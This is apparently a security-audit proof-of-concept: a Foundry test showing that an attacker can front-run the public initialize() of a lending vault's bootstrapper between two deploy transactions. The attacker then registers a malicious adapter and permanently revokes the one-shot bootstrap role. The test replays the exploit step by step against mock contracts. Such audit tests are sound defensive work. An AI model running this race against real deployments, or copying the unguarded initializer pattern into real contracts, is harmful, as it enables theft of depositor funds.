// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/**
 * FINDING: StrategyBootstrapper.initialize() has no access control beyond
 *          OpenZeppelin's `initializer` one-shot guard. `deployer` is now a
 *          caller-supplied parameter (no longer `msg.sender` captured in an
 *          immutable constructor as in the pre-V10 design), and the actual
 *          shipped deploy script (script/DeployUsdcLendingStrategy.s.sol:
 *          291-292) deploys the bootstrapper and initializes it as TWO
 *          SEPARATE on-chain transactions:
 *
 *              StrategyBootstrapper boot = new StrategyBootstrapper();   // tx N
 *              boot.initialize(payable(address(result.strategy)), cfg.deployer);  // tx N+1
 *
 *          Between these two transactions, `boot` exists on-chain,
 *          uninitialized, and its `initialize()` function is public and
 *          callable by anyone. Whoever's `initialize()` call is mined FIRST
 *          wins — the `initializer` modifier only prevents a SECOND call, it
 *          does not check who the first caller is.
 *
 * SEVERITY: CRITICAL. The vault's constructor already grants BOOTSTRAP_ROLE
 *           to the bootstrapper's (predicted/precomputed) address BEFORE
 *           `initialize()` is ever called — so the race is purely over who
 *           gets to set `deployer` in storage, not over the role grant
 *           itself. Whoever wins becomes the only address that can call
 *           `bootstrap(adapters[])`. Since `whitelistAdapter()`
 *           (StrategySettingsModule.sol:426-434) accepts BOOTSTRAP_ROLE (not
 *           just DEFAULT_ADMIN_ROLE) specifically so the bootstrapper can
 *           self-whitelist adapters, an attacker who wins the race can
 *           register and enable ARBITRARY, attacker-controlled adapters as
 *           trusted strategy adapters, then the one-shot BOOTSTRAP_ROLE is
 *           permanently renounced — irreversibly locking out legitimate
 *           governance from ever registering the intended adapter set via
 *           this path. At minimum (if the attacker doesn't also call
 *           `bootstrap()`), it silently DoSes the real deployment: the
 *           legitimate operator's `initialize()` call reverts.
 *
 * This PoC reproduces the exact two-transaction sequence from the shipped
 * deploy script and shows an attacker winning the race between them.
 */

import { Test, console2 } from "forge-std/Test.sol";
import { UsdcMultiLendingVault } from "../../../../src/strategies/usdc-lending/controller/UsdcLendingStrategy.sol";
import { StrategyBootstrapper } from "../../../../src/strategies/usdc-lending/StrategyBootstrapper.sol";
import { StrategyParamsModule } from "../../../../src/strategies/usdc-lending/controller/StrategyParamsModule.sol";
import { StrategyAdapterOpsModule } from "../../../../src/strategies/usdc-lending/controller/StrategyAdapterOpsModule.sol";
import { StrategyScoringModule } from "../../../../src/strategies/usdc-lending/controller/StrategyScoringModule.sol";
import { StrategyRebalanceGateModule } from "../../../../src/strategies/usdc-lending/controller/StrategyRebalanceGateModule.sol";
import { StrategySettingsModule } from "../../../../src/strategies/usdc-lending/controller/StrategySettingsModule.sol";
import { MockUSDC, MockLendingAdapter } from "../UsdcMultiLendingVault.t.sol";

contract BootstrapperFrontRun_PoC is Test {
    address constant ARBITRUM_USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;

    address deployer = address(0xD00D);       // legitimate operator running the deploy script
    address attacker = address(0xBAD);        // has no role, no special access anywhere
    address core = address(0x2);
    address router = address(0x6);
    address rootTimelock = address(0x7);
    address guardian = address(0x8);

    MockUSDC usdc;
    UsdcMultiLendingVault vault;

    function setUp() public {
        usdc = new MockUSDC();
        vm.etch(ARBITRUM_USDC, address(usdc).code);
        usdc = MockUSDC(ARBITRUM_USDC);
    }

    function _defaultParams() internal pure returns (UsdcMultiLendingVault.StrategyInitParams memory) {
        return UsdcMultiLendingVault.StrategyInitParams({
            maxAdaptersPerAllocation: 3,
            minAdaptersActive: 1,
            rebalanceMinMoveBps: 50,
            minSecondsBetweenRebalances: 21600,
            driftToleranceBps: 80,
            wAPY: 4000, wLiq: 2000, wRisk: 2000, wStability: 1000, wIncentive: 1000,
            incentiveDecayHalfLife: 86400,
            adapterMaxExposureBps: 5000,
            newAdapterRampBps: 5000,
            gateHorizonDays: 7,
            gateMinNetBenefitBps: 2,
            slippageBpsEstimate: 5,
            withdrawalSpreadBpsEstimate: 5,
            gasCostUSDC: 1e6,
            harvestThresholdBps: 5,
            minSecondsBetweenHarvests: 43200,
            dustTolerance: 3e6,
            stabilityEMAPeriod: 7,
            minNewAdapterSeed: 0,
            newAdapterRampDuration: 0,
            maxIdleAfterDepositBps: 500,
            maxIdleBootstrapBps: 5000,
            degradedViewThresholdBps: 2500,
            failureDecaySeconds: 3600,
            minSecondsBetweenDeployIdle: 300,
            bootstrapDuration: 86400,
            maxRelativeExposureBps: 0,
            externalTVLStalenessSeconds: 43200
        });
    }

    function test_POC_attacker_frontruns_bootstrapper_initialize_and_hijacks_adapter_set() public {
        // --- Replicate DeployUsdcLendingStrategy.s.sol Phase 1.1-1.2 exactly ---

        StrategyParamsModule paramsModule = new StrategyParamsModule(ARBITRUM_USDC, core);
        StrategyAdapterOpsModule adapterOpsMod = new StrategyAdapterOpsModule(
            ARBITRUM_USDC, core, address(paramsModule), address(0), address(0)
        );
        StrategyScoringModule scoringMod = new StrategyScoringModule(
            ARBITRUM_USDC, core, address(paramsModule), address(0), address(adapterOpsMod)
        );
        StrategyRebalanceGateModule gateMod = new StrategyRebalanceGateModule(
            ARBITRUM_USDC, core, address(paramsModule), address(scoringMod), address(adapterOpsMod)
        );

        // The deploy script pre-computes the bootstrapper's future CREATE address
        // and passes it into the vault constructor so BOOTSTRAP_ROLE can be
        // granted before the bootstrapper even exists on-chain.
        vm.startPrank(deployer);
        address predictedBootstrapper = vm.computeCreateAddress(deployer, vm.getNonce(deployer) + 1);

        // Phase 1.1: deploy the vault (tx N-ish)
        vault = new UsdcMultiLendingVault(
            ARBITRUM_USDC, core, router, rootTimelock, guardian,
            predictedBootstrapper,
            address(paramsModule), address(scoringMod), address(adapterOpsMod), address(gateMod),
            _defaultParams()
        );
        assertTrue(vault.hasRole(vault.BOOTSTRAP_ROLE(), predictedBootstrapper), "sanity: role pre-granted to predicted address");

        // Phase 1.2, first half — "StrategyBootstrapper boot = new StrategyBootstrapper();" (tx N)
        StrategyBootstrapper boot = new StrategyBootstrapper();
        assertEq(address(boot), predictedBootstrapper, "sanity: address prediction matches (as it does in the real script)");
        vm.stopPrank();

        // Wire StrategySettingsModule (holds whitelistAdapter()) so bootstrap()
        // can complete -- rootTimelock holds DEFAULT_ADMIN_ROLE from the
        // vault constructor.
        StrategySettingsModule settingsMod = new StrategySettingsModule(ARBITRUM_USDC, core);
        vm.prank(rootTimelock);
        vault.setSettingsModule(address(settingsMod));

        // *** THE WINDOW ***
        // On a real chain, "boot.initialize(strategy, cfg.deployer);" (tx N+1) is
        // now sitting in the mempool. Nothing stops anyone else from getting
        // their own initialize() call mined first.
        vm.prank(attacker);
        boot.initialize(payable(address(vault)), attacker);

        assertEq(boot.deployer(), attacker, "VULNERABLE: attacker, not the legitimate deployer, is now the bootstrapper's deployer");

        // The legitimate operator's own initialize() call (tx N+1 in the real
        // script) now reverts -- the honest deployment is bricked/DoS'd.
        vm.prank(deployer);
        vm.expectRevert(bytes("Initializable: contract is already initialized"));
        boot.initialize(payable(address(vault)), deployer);

        // Worse: the attacker is now the ONLY address that can call bootstrap().
        // whitelistAdapter() accepts BOOTSTRAP_ROLE, so the bootstrapper can
        // self-whitelist whatever the attacker passes in.
        MockLendingAdapter maliciousAdapter = new MockLendingAdapter(ARBITRUM_USDC);
        maliciousAdapter.setVault(address(vault));
        address[] memory hijackedList = new address[](1);
        hijackedList[0] = address(maliciousAdapter);

        vm.prank(attacker);
        boot.bootstrap(hijackedList);

        assertTrue(vault.isAdapter(address(maliciousAdapter)), "VULNERABLE: attacker-supplied adapter is now a registered, trusted strategy adapter");
        assertTrue(vault.enabled(address(maliciousAdapter)), "VULNERABLE: and it's enabled -- eligible to receive real depositor USDC");
        assertFalse(
            vault.hasRole(vault.BOOTSTRAP_ROLE(), address(boot)),
            "BOOTSTRAP_ROLE permanently renounced -- legitimate governance can NEVER use this one-shot path again"
        );
    }
}
